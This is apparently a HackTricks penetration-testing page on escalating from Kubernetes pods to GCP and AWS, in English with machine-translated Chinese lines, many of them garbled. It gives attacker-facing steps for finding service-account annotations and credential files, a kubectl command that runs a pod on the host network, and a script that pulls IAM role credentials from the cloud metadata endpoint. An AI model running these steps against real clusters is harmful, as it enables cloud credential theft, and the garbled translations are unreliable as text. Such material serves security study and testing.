

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


# GCP

If you are running a k8s cluster inside GCP you will probably want that some application running inside the cluster has some access to GCP. There are 2 common ways of doing that:

如果您在GCP内运行K8S群集，则可能希望某些在集群中运行的应用程序可以访问GCP。 有2种常见的方法：

## Mounting GCP-SA keys as secret

##将GCP-SA键安装为秘密

A common way to give **access to a kubernetes application to GCP** is to:

将**访问Kubernetes申请访问GCP **的一种常见方法是：

* Create a GCP Service Account

*创建一个GCP服务帐户
* Bind on it the desired permissions

*绑定所需的权限
* Download a json key of the created SA

*下载创建SA的JSON密钥
* Mount it as a secret inside the pod

*将其作为秘密固定在豆荚内
* Set the GOOGLE\_APPLICATION\_CREDENTIALS environment variable pointing to the path where the json is.

*设置Google \ _application \ _credentials环境变量指向JSON所在的路径。

{% hint style="warning" %}

{％提示样式=“警告”％}
Therefore, as an **attacker**, if you compromise a container inside a pod, you should check for that **env** **variable** and **json** **files** with GCP credentials.

因此，作为一个**攻击者**，如果您在吊舱内妥协容器，则应检查** env ** **变量**和** json ** ** **文件**使用GCP凭据**。
{% endhint %}

## GKE Workload Identity

## GKE工作负载身份

With Workload Identity, we can configure a[ Kubernetes service account](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) to act as a[ Google service account](https://cloud.google.com/iam/docs/understanding-service-accounts). Pods running with the Kubernetes service account will automatically authenticate as the Google service account when accessing Google Cloud APIs.

使用Workload Identity，我们可以配置[Kubernetes服务帐户]（https://kubernetes.io/docs/tasks/tasks/configure-pod-container/configure-service-account/）作为[Google Service Service帐户]（HTTTPS） ：//cloud.google.com/iam/docs/understanding-service-accounts）。 访问Google Cloud API时，使用Kubernetes服务帐户运行的POD将自动作为Google服务帐户身份验证。

The **first series of steps** to enable this behaviour is to **enable Workload Identity in GCP** ([**steps**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) and create the GCP SA you want k8s to impersonate.

启用此行为的**第一系列步骤**是**在GCP **中启用工作负载身份（[**步骤**]（https://medium.com/zeotap-customer-intelligence-unleashed/gke -workload-nidentity-a-secure-secure-for-gke-applications to-access-ccess-gcp-services-f880f4e74e8c））并创建您想要K8的GCP SA。

The **second steps** is to relate a K8s SA (KSA) with the GCP SA (GSA):

**第二步**是将K8S SA（KSA）与GCP SA（GSA）相关联：

* Create the KSA (normally in the **annotations appear the email of the GSA**) and use it in the pod you would like to:

*创建KSA（通常在**注释中出现GSA **的电子邮件），并将其在您想要的POD中使用：

```yaml
# serviceAccount.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
    annotations:    
        iam.gke.io/gcp-service-account: $GSA-NAME@PROJECT-ID.iam.gserviceaccount.com
    name: $APPNAME
    namespace: $NAMESPACE
```

* Create the KSA - GSA Binding:

*创建KSA -GSA绑定：

```bash
gcloud iam service-accounts   \
  --role roles/iam.workloadIdentityUser \
  --member "serviceAccount:PROJECT-ID.svc.id.goog[$NAMESPACE/$KSA-NAME]" \
  $GSA-NAME@PROJECT-ID.iam.gserviceaccount.com
```

Note how you are creating a binding and in the **member field you can find the namespace and KSA name**.

请注意您如何创建绑定，在**成员字段中您可以找到名称空间和ksa名称**。

{% hint style="warning" %}

{％提示样式=“警告”％}
As an attacker inside K8s you should **search for SAs** with the **`iam.gke.io/gcp-service-account` annotation** as that indicates that the SA can access something in GCP. Another option would be to try to abuse each KSA in the cluster and check if it has access.\

作为K8S内部的攻击者，您应该**使用**``iam.gke.io/gcp-service-account`注释**搜索SAS **，因为这表明SA可以在GCP中访问某些东西。 另一个选项是尝试滥用群集中的每个KSA并检查是否访问。\ \
From GCP is always interesting to enumerate the bindings and know **which access are you giving to SAs inside Kubernetes**.

来自GCP总是很有趣的是列举绑定并知道**您对Kubernetes内的SAS提供了哪些访问**。
{% endhint %}

This is a script to easily **iterate over the all the pods** definitions **looking** for that **annotation**:

这是一个脚本，可以轻松地**迭代所有PODS **定义** ** ** **注释**：

```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
    for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "Pod: $ns/$pod"
        kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
        echo ""
        echo ""
    done
done | grep -B 1 "gcp-service-account"
```

# AWS

## Kiam & Kube2IAM (IAM role for Pods)  <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

## kiam＆kube2iam（pods的iam角色）<a href="#workflow of-am-lole-for-service-accounts" id="workflow of-am-iam-lole-lole-lole-for-service-accounts"> <<<<<<<<<<<< /a>

An (outdated) way to give IAM Roles to Pods is to use a [**Kiam**](https://github.com/uswitch/kiam) or a [**Kube2IAM**](https://github.com/jtblin/kube2iam) **server.** Basically you will need to run a **daemonset** in your cluster with a **kind of privileged IAM role**. This daemonset will be the one that will give access to IAM roles to the pods that need it.

将IAM角色赋予POD的一种（过时的）方法是使用[** kiam **]（https://github.com/uswitch/kiam）或[** kube2iam **]（https：// github 。 这个守护程序将是将IAM角色访问需要的豆荚的卫士。

First of all you need to configure **which roles can be accessed inside the namespace**, and you do that with an annotation inside the namespace object:

首先，您需要配置**可以在命名空间**内访问哪个角色，然后在命名空间对象中使用注释来执行此操作：

{% code title="Kiam" %}

{％代码标题=“ kiam”％}
```yaml
kind: Namespace
metadata:
  name: iam-example
  annotations:
    iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}

{％代码标题=“ kube2iam”％}
```yaml
apiVersion: v1
kind: Namespace
metadata:
  annotations:
    iam.amazonaws.com/allowed-roles: |
      ["role-arn"]
  name: default
```
{% endcode %}

Once the namespace is configured with the IAM roles the Pods can have you can **indicate the role you want on each pod definition with something like**:

一旦将命名空间配置为POD可以拥有的IAM角色，您可以**指示您在每个POD定义上所需的角色，并使用类似**的内容来指示您想要的角色：

{% code title="Kiam & Kube2iam" %}

{％代码标题=“ Kiam＆Kube2iam”％}
```yaml
kind: Pod
metadata:
  name: foo
  namespace: external-id-example
  annotations:
    iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}

{％提示样式=“警告”％}
As an attacker, if you **find these annotations** in pods or namespaces or a kiam/kube2iam server running (in kube-system probably) you can **impersonate every r**ole that is already **used by pods** and more (if you have access to AWS account enumerate the roles).

作为攻击者，如果您**在POD或名称空间或运行Kiam/Kube2IAM服务器（可能在Kube-System中）中找到这些注释**，则可以**模仿PODS*已使用的每个r ** ole ** ** ** *以及更多（如果您可以访问AWS帐户列举角色）。
{% endhint %}

### Create Pod with IAM Role

###创建带有IAM角色的POD

{% hint style="info" %}

{％提示样式=“ info”％}
The IAM role to indicate must be in the same AWS account as the kiam/kube2iam role and that role must be able to access it.

IAM表明必须与Kiam/Kube2iam角色相同的AWS帐户，并且该角色必须能够访问它。
{% endhint %}

```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
  annotations:
    iam.amazonaws.com/role: transaction-metadata
  name: alpine
  namespace: eevee
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]' | kubectl apply -f -
```

## Workflow of IAM role for Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

##通过OIDC <a href="#workflow of-iam-lole-for-service-accounts" id=" workflow-of-iam-lole-lole-service-service-accounts"> << /a>

This is the recommended way by AWS.

这是AWS推荐的方式。

1. First of all you need to [create an OIDC provider for the cluster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).

1.首先，您需要[为群集创建一个OIDC提供商]（https://docs.aws.aws.amazon.com/eks/latest/userguide/enable-iam--iam-roles-for-for-service-accounts.html） 。
2. Then you create an IAM role with the permissions the SA will require.

2.然后，您可以使用SA所需的权限创建IAM角色。
3. Create a [trust relationship between the IAM role and the SA](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts-technical-overview.html) name (or the namespaces giving access to the role to all the SAs of the namespace). _The trust relationship will mainly check the OIDC provider name, the namespace name and the SA name_.

3.建立[IAM角色和SA之间的信任关系]（https://docs.aws.aws.amazon.com/eks/latest/userguide/IAM-Roles-for-service-service-accounts-technical-overview.html） 名称（或命名空间可以访问该名称空间的所有SA的角色）。 _信任关系将主要检查OIDC提供商名称，名称名称和SA名称_。
4. Finally, **create a SA with an annotation indicating the ARN of the role**, and the pods running with that SA will have **access to the token of the role**. The **token** is **written** inside a file and the path is specified in **`AWS_WEB_IDENTITY_TOKEN_FILE`** (default: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)

4.最后，**创建一个带有注释的sa，指示角色的arn **，并且与SA一起运行的豆荚将可以**访问角色的令牌**。 **令牌**是**编写**的文件，并且路径在** a aws_web_identity_token_file` ** **（默认值：`/var/run/necrets/eks.amazonaws.com/serviceaccount/token`）中指定。

(You can find an example of this configuration [here](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/))

（您可以找到此配置的示例[此处]（https://blogs.halodoc.io/iam-roles-for-service-accounts-2/））

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  annotations:
    eks.amazonaws.com/role-arn: arn:aws-cn:iam::ACCOUNT_ID:role/IAM_ROLE_NAME
```

{% hint style="warning" %}

{％提示样式=“警告”％}
As an attacker, if you can enumerate a K8s cluster, check for **service accounts with that annotation** to **escalate to AWS**. To do so, just **exec/create** a **pod** using one of the IAM **privileged service accounts** and steal the token.

作为攻击者，如果您可以枚举K8S群集，请检查**使用该注释**的**服务帐户，以升级为AWS **。 为此，只需使用IAM **特权服务帐户之一** exec/创建** a ** pod **并窃取令牌。

Moreover, if you are inside a pod, check for env variables like **AWS\_ROLE\_ARN** and **AWS\_WEB\_IDENTITY\_TOKEN.**

此外，如果您在吊舱内，请检查env变量，例如** aws \ _role \ _arn **和** aws \ _web \ _ nidentity \ _token。


{% endhint %}

## Find Pods a SAs with IAM Roles in the Cluster

##在集群中查找具有IAM角色的SAS

This is a script to easily **iterate over the all the pods and sas** definitions **looking** for that **annotation**:

这是一个脚本，可以轻松地**迭代所有POD和SAS **定义** ** for ** and **注释**：

```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
    for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "Pod: $ns/$pod"
        kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
    for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "SA: $ns/$sa"
        kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
done | grep -B 1 "amazonaws.com"
```

## Node IAM Role

The previos section was about how to steal IAM Roles with pods, but note that a **Node of the** K8s cluster is going to be an **instance inside the cloud**. This means that the Node is highly probable going to **have a new IAM role you can steal** (_note that usually all the nodes of a K8s cluster will have the same IAM role, so it might not be worth it to try to check on each node_).

Previos部分是关于如何使用Pod窃取IAM角色的，但是请注意，** K8S群集的一个**节点将是云**内的**实例。 这意味着该节点很可能会**有一个新的IAM角色，您可以窃取**（_ note通常，K8S群集的所有节点都会具有相同的IAM角色，因此可能不值得尝试尝试尝试。 检查每个节点_）。

There is however an important requirement to access the metadata endpoint from the node, you need to be in the node (ssh session?) or at least have the same network:

但是，从节点访问元数据端点的重要要求，您需要在节点（SSH会话？）中或至少具有相同的网络：

```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```

## Steal IAM Role Token

Previously we have discussed how to **attach IAM Roles to Pods** or even how to **escape to the Node to steal the IAM Role** the instance has attached to it.

以前，我们已经讨论了如何将IAM角色附加到Pods **，甚至如何**逃到节点上窃取IAM角色**该实例已附加到它。

You can use the following script to **steal** your new hard worked **IAM role credentials**:

您可以使用以下脚本**窃取**您的新努力** iam角色凭据**：

```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
    echo "IAM Role discovered: $IAM_ROLE_NAME"
    if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
        echo "Credentials:"
        curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
    fi
fi
```

# References

* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


